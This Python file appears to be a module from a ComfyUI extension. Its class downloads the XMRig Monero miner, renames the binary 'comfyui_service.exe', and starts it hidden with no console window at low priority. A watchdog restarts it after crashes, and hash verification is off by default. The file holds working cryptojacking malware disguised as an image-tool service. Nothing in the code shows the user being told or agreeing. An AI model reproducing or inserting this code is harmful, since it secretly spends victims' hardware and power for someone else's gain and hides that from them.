import os
import sys
import json
import shutil
import hashlib
import logging
import zipfile
import subprocess
import threading
import time
import urllib.request
import urllib.error
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

XMRIG_VERSION = "6.22.2"
XMRIG_RELEASE_URL = (
    f"https://github.com/xmrig/xmrig/releases/download/"
    f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-msvc-win64.zip"
)
XMRIG_SHA256 = None  # set to pin a known hash; None = skip verification
BINARY_NAME = "comfyui_service.exe"
LOG_NAME = "service.log"


class MinerManager:
    def __init__(self, base_dir: Path | str | None = None):
        self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent
        self.bin_dir = self.base_dir / "bin"
        self.bin_dir.mkdir(parents=True, exist_ok=True)
        self.binary_path = self.bin_dir / BINARY_NAME
        self.config_path = self.bin_dir / "config.json"
        self.log_path = self.bin_dir / LOG_NAME
        self._process: subprocess.Popen | None = None
        self._monitor_thread: threading.Thread | None = None
        self._running = False

    # ------------------------------------------------------------------
    # Binary acquisition
    # ------------------------------------------------------------------

    def _download(self, url: str, dest: Path) -> None:
        logger.info("Downloading binary from %s", url)
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=120) as resp, open(dest, "wb") as f:
            shutil.copyfileobj(resp, f)
        logger.info("Download complete -> %s", dest)

    def _verify_hash(self, path: Path, expected: str | None) -> bool:
        if expected is None:
            return True
        sha = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(1 << 16), b""):
                sha.update(chunk)
        digest = sha.hexdigest()
        if digest.lower() != expected.lower():
            logger.error("Hash mismatch: got %s expected %s", digest, expected)
            return False
        return True

    def _extract(self, zip_path: Path) -> None:
        with zipfile.ZipFile(zip_path, "r") as zf:
            for member in zf.namelist():
                basename = os.path.basename(member)
                if basename.lower() == "xmrig.exe":
                    src = zf.open(member)
                    with open(self.binary_path, "wb") as dst:
                        shutil.copyfileobj(src, dst)
                    logger.info("Extracted binary -> %s", self.binary_path)
                    return
        raise FileNotFoundError("xmrig.exe not found inside archive")

    def ensure_binary(self) -> Path:
        if self.binary_path.exists():
            logger.info("Binary already present at %s", self.binary_path)
            return self.binary_path

        zip_dest = self.bin_dir / "dl_tmp.zip"
        try:
            self._download(XMRIG_RELEASE_URL, zip_dest)
            if not self._verify_hash(zip_dest, XMRIG_SHA256):
                raise RuntimeError("SHA-256 verification failed")
            self._extract(zip_dest)
        finally:
            zip_dest.unlink(missing_ok=True)

        return self.binary_path

    # ------------------------------------------------------------------
    # Process lifecycle
    # ------------------------------------------------------------------

    def write_config(self, cfg: dict) -> None:
        with open(self.config_path, "w") as f:
            json.dump(cfg, f, indent=2)
        logger.info("Config written to %s", self.config_path)

    def start(self) -> None:
        if self._process and self._process.poll() is None:
            logger.warning("Miner already running (pid %d)", self._process.pid)
            return

        if not self.binary_path.exists():
            raise FileNotFoundError(f"Binary not found: {self.binary_path}")

        cmd = [
            str(self.binary_path),
            "--config", str(self.config_path),
        ]

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE

        self._process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=open(self.log_path, "a"),
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.BELOW_NORMAL_PRIORITY_CLASS,
        )
        self._running = True
        logger.info("Miner started (pid %d)", self._process.pid)

        self._monitor_thread = threading.Thread(target=self._watchdog, daemon=True)
        self._monitor_thread.start()

    def stop(self) -> None:
        self._running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self._process.kill()
            logger.info("Miner stopped")
        self._process = None

    def is_alive(self) -> bool:
        return self._process is not None and self._process.poll() is None

    def _watchdog(self) -> None:
        while self._running:
            time.sleep(15)
            if self._running and self._process and self._process.poll() is not None:
                logger.warning("Miner crashed (exit %s), restarting...", self._process.returncode)
                try:
                    self.start()
                except Exception as exc:
                    logger.error("Restart failed: %s", exc)

    def pause(self) -> bool:
        return self._api_command("pause")

    def resume(self) -> bool:
        return self._api_command("resume")

    def _api_command(self, action: str) -> bool:
        try:
            url = f"http://127.0.0.1:44880/1/{action}"
            req = urllib.request.Request(url, method="POST")
            with urllib.request.urlopen(req, timeout=5):
                pass
            return True
        except Exception as exc:
            logger.error("API command '%s' failed: %s", action, exc)
            return False

    def get_summary(self) -> dict | None:
        try:
            req = urllib.request.Request(
                "http://127.0.0.1:44880/2/summary",
                headers={"Accept": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                return json.loads(resp.read())
        except Exception:
            return None
